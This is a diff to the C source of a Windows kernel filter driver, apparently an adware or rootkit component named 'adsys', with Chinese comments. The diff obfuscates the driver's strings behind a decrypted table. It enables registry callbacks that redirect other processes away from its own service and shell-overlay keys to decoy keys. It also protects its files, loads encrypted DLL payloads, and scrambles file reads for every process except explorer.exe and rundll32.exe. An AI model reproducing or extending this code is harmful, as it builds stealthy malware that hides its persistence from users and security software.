@@ -18,6 +18,7 @@
 //#######################################################################################
 
 #ifndef CXX_ADSYS_H
+
 #include <fltKernel.h>
 #include "adsys.h"
 #include "str.h"
@@ -109,19 +110,46 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
         IoDeleteDevice(pDevObj);
         return status;
     }
-    //IoRegisterShutdownNotification(pDevObj);
-    //g_drobj=pDriverObj;
+	 g_drobj=pDriverObj;
+    IoRegisterShutdownNotification(pDevObj);
+
     //
     //  TODO: Add initialization code here.
     //
-//浏览器
+//浏览器 
 	MyDecryptFile(strbrowser,sizeof(strbrowser),0xb);
-	memcpy(pBrowser,strbrowser,sizeof(strbrowser));
+	if (TRUE)
+		{ 
+			
+			CHAR *pnext=(CHAR*)strbrowser;
+			CHAR *pRetBuff=NULL;
+			pRetBuff =	strtok_s(pnext,"\r",&pnext);
+			while (_stricmp(pnext,"")!=0)
+			{
+	
+				ANSI_STRING AnsiString2;
+				UNICODE_STRING UnicodeString2;
+				RtlInitString(&AnsiString2, pRetBuff);
+				status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
+	
+				g_pStrBuffer[g_iStrBuffer]=(WCHAR*)kmalloc(UnicodeString2.Length+2);
+				memset(g_pStrBuffer[g_iStrBuffer],0,UnicodeString2.Length+2);
+				memcpy(g_pStrBuffer[g_iStrBuffer],UnicodeString2.Buffer,UnicodeString2.Length);
+				RtlFreeUnicodeString(&UnicodeString2);
+
+//				kprintf("g_iStrBuffer:%d name:%s",g_iStrBuffer,pRetBuff);
+
+				
+				g_iStrBuffer++;
+				pRetBuff= strtok_s((PCHAR)pnext,"\r\n",&pnext);
+			} 
+	
+		}
 
 
     InitializeListHead(&g_ListProcess);
 	for(i=0;i<14;i++){
-		 AppendListNode(pBrowser[i],&g_ListProcess,0);
+		 AppendListNode(g_pStrBuffer[i],&g_ListProcess,0);
 	}
 	
     //AppendListNode(L"360se.exe",&g_ListProcess,0);
@@ -142,8 +170,8 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 //要保护的文件
     InitializeListHead(&g_ProtectFile);
     KeInitializeSpinLock(&g_spin_lockfile);
-    AppendListNode(pBrowser[14],&g_ProtectFile,2);
-    AppendListNode(pBrowser[15],&g_ProtectFile,1);
+    AppendListNode(g_pStrBuffer[14],&g_ProtectFile,2);
+    AppendListNode(g_pStrBuffer[15],&g_ProtectFile,1);
 //不让访问的进程名
     //InitializeListHead(&g_AntiProcess);
     //KeInitializeSpinLock(&g_spin_process);
@@ -151,24 +179,22 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
     ////kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
     //status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
-
-
 #ifdef _AMD64_
     //x64 add code
-    status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
+    status = MzReadFile(g_pStrBuffer[16],&g_pDll64,&g_iDll64);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll64,g_iDll64,16);
 
     }
 
-    status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+    status = MzReadFile(g_pStrBuffer[17],&g_pDll32,&g_iDll32);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll32,g_iDll32,16);
     }
 
 #else
     //x86 add code
-    status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+    status = MzReadFile(g_pStrBuffer[17],&g_pDll32,&g_iDll32);
     if (NT_SUCCESS(status)) {
         MyDecryptFile(g_pDll32,g_iDll32,16);
     }
@@ -193,26 +219,26 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
     //// 映像加载回调
 
-    //status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-    //if(!NT_SUCCESS(status)) {
-    //    kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
-    //}
+    status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    if(!NT_SUCCESS(status)) {
+        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
+    }
 
-    //////注册表回调监控
-    //SetRegisterCallback();
-    ////文件回调监控
-    //ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
-    //status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
-    //ASSERT( NT_SUCCESS( status ) );
-    //if (NT_SUCCESS( status )) {
-    //    //
-    //    //  Start filtering i/o
-    //    //
-    //    status = FltStartFiltering( gFilterHandle);
-    //    if (!NT_SUCCESS( status )) {
-    //        FltUnregisterFilter( gFilterHandle);
-    //    }
-    //}
+    ////注册表回调监控
+    SetRegisterCallback();
+    //文件回调监控
+    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
+    status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
+    ASSERT( NT_SUCCESS( status ) );
+    if (NT_SUCCESS( status )) {
+        //
+        //  Start filtering i/o
+        //
+        status = FltStartFiltering( gFilterHandle);
+        if (!NT_SUCCESS( status )) {
+            FltUnregisterFilter( gFilterHandle);
+        }
+    }
     return STATUS_SUCCESS;
 }
 
@@ -226,8 +252,8 @@ VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
     //
     // TODO: Add uninstall code here.
     //
-    //PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-    //RemoveRegisterCallback();
+    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    RemoveRegisterCallback();
     // Delete the symbolic link
     RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
     IoDeleteSymbolicLink(&strLink);
@@ -1210,7 +1236,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
     //  the draining flag is not set.
     //
     ASSERT(!FlagOn(Flags, FLTFL_POST_OPERATION_DRAINING));
-    try {
+    try { 
         //
         //  If the operation failed or the count is zero, there is no data to
         //  copy so just return now.
@@ -1348,11 +1374,11 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (IN OUT PFLT_CALLBACK_DATA Data,IN P
     //
     //  Free allocated memory and release the volume context
     //
-    ExFreePool( p2pCtx->SwappedBuffer );
-    FltReleaseContext( p2pCtx->VolCtx );
+	ExFreePool(p2pCtx->SwappedBuffer);
+	FltReleaseContext(p2pCtx->VolCtx);
+	FltReleaseContext(p2pCtx->pStreamCtx);
+	ExFreeToNPagedLookasideList(&Pre2PostContextList, p2pCtx);
 
-    ExFreeToNPagedLookasideList( &Pre2PostContextList,
-                                 p2pCtx );
 
     return FLT_POSTOP_FINISHED_PROCESSING;
 }
@@ -1390,43 +1416,62 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
             WCHAR                       exename[216] = { 0 };
             WCHAR                       PathReg[512] = { 0 };
             PUNICODE_STRING             RootKeyName;
-            if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
+          if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
                 PUNICODE_STRING  pPath = KeyInfo->CompleteName;
 
-                WCHAR   key[512] = { 0 };
+                WCHAR   key[512] = { 0 }; 
                 if (GetNameByUnicodeString(pPath, key)) {
                     WCHAR exename[512]= {0};
                     UNICODE_STRING FullKeyName = { 0 };
+					ULONG   udesire=KEY_ALL_ACCESS | KEY_WOW64_64KEY;
+                    if (_wcsicmp(key, g_pStrBuffer[22]) == 0) {  //adplug
 
-                    if (_wcsicmp(key, L"adplug") == 0) {
                         WCHAR *pslr = NULL;
                         BOOLEAN  bGetName=FALSE;
+
                         status = LfGetObjectName( KeyInfo->RootObject, &RootKeyName );
                         if ( NT_SUCCESS(status) ) {
                             _wcslwr(RootKeyName->Buffer, RootKeyName->Length);
-                            if (wcsstr(RootKeyName->Buffer, L"explorer\\shelliconoverlayidentifiers")) {
+
+                            if (wcsstr(RootKeyName->Buffer, g_pStrBuffer[25])) { //L"explorer\\shelliconoverlayidentifiers"
                                 kfree( RootKeyName );
-                                goto LABEL1;
+                                goto LABEL1; 
                             }
                             kfree( RootKeyName );
                         }
+					
                         pslr = _wcslwr(pPath->Buffer, pPath->Length);
-                        if (wcsstr(pslr, L"shelliconoverlayidentifiers\\adplug")) {
-
+//							kprintf("find pPath:%wZ g_pStrBuffer[21]:%ws",pPath,g_pStrBuffer[21]);
+                        //pslr:software\microsoft\windows\currentversion\explorer\shelliconoverlayidentifiers\0overlayicon
+                        if (wcsstr(pslr, g_pStrBuffer[21])) {//L"shelliconoverlayidentifiers\\0overlayIcon"
                         LABEL1:
                             bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
-                            if (bGetName&&_wcsicmp(L"explorer.exe",exename)!=0) {
-                                RedirectReg(KeyInfo,NotifyClass,L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files");
+                            if (bGetName&&_wcsicmp(g_pStrBuffer[18],exename)!=0) { //L"explorer.exe"
+                                BOOLEAN  bRedirect=TRUE;
+                                //L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
+                                if (KeyInfo->DesiredAccess==KEY_ALL_ACCESS||KeyInfo->DesiredAccess==udesire) {
+									if(KeyInfo->GrantedAccess==0&&KeyInfo->CreateOptions==0) bRedirect=FALSE;
+                                    else bRedirect=TRUE;
+                                }else bRedirect=TRUE;
+                                if (bRedirect==TRUE) {
+                                    status =  RedirectReg(KeyInfo,NotifyClass,g_pStrBuffer[20]);
+                                }else{
+//									kprintf("exename:%ws DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",exename,KeyInfo->DesiredAccess,KeyInfo->GrantedAccess,KeyInfo->Disposition,KeyInfo->CreateOptions);
+//									kprintf("exename:%ws udesire:%x  KEY_ALL_ACCESS:%x",exename,udesire,KEY_ALL_ACCESS);
+
+								}
+
                             }
                         }
-                    } else if(_wcsicmp(key, L"adsys") == 0) {
+                    } else if(_wcsicmp(key, g_pStrBuffer[23]) == 0) {  //L"adsys"
                         WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
-                        if (wcsstr(pslr, L"services\\adsys")!=NULL) {
+                        if (wcsstr(pslr, g_pStrBuffer[24])!=NULL) { //L"services\\adsys"
                             BOOLEAN   bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
-                            if (bGetName&&_wcsicmp(L"services.exe",exename)!=0) {
-                                //kprintf("exename:%ws Path:%wZ",exename,pPath);
-                                RedirectReg(KeyInfo,NotifyClass,L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI" );
-
+                            if (bGetName&&_wcsicmp(g_pStrBuffer[26],exename)!=0) {
+//								kprintf("DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",KeyInfo->DesiredAccess,KeyInfo->GrantedAccess,KeyInfo->Disposition,KeyInfo->CreateOptions);
+                                //L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI"
+                               status =   RedirectReg(KeyInfo,NotifyClass,g_pStrBuffer[20]);  //g_pStrBuffer[3]   g_pStrBuffer[4]--
+ 
                             }
 
                         }
@@ -1434,7 +1479,10 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
 
                 }
             }
-        }
+
+
+
+		}
     }
     return status;
 }
@@ -2349,7 +2397,7 @@ void EncodeBuffer(PFLT_CALLBACK_DATA Cbd,PPRE_2_POST_CONTEXT p2pCtx,PUCHAR origB
                 //                  kprintf("[PostRead] exename:%ws  bgetname:%d pid:%d",exename,bgetname,PsGetCurrentProcessId());
 
 
-                if (_wcsicmp(exename,L"explorer.exe")==0||_wcsicmp(exename,L"rundll32.exe")==0) {
+                if (_wcsicmp(exename,g_pStrBuffer[18])==0||_wcsicmp(exename,g_pStrBuffer[19])==0) {
                     RtlCopyMemory( origBuf,p2pCtx->SwappedBuffer, Cbd->IoStatus.Information );
                 } else {
                     ULONG i=0;
@@ -2368,7 +2416,7 @@ void EncodeBuffer(PFLT_CALLBACK_DATA Cbd,PPRE_2_POST_CONTEXT p2pCtx,PUCHAR origB
 
 }
 //L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
-void RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo,long NotifyClass,WCHAR path[])
+NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo,long NotifyClass,WCHAR path[])
 {
     NTSTATUS status = STATUS_SUCCESS;
     UNICODE_STRING FullKeyName = { 0 };
@@ -2402,6 +2450,7 @@ void RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo,long NotifyClass,WCHAR path
 
         ZwClose(KeyHandle);
     }
+	return status;
 }
 
 /* EOF */
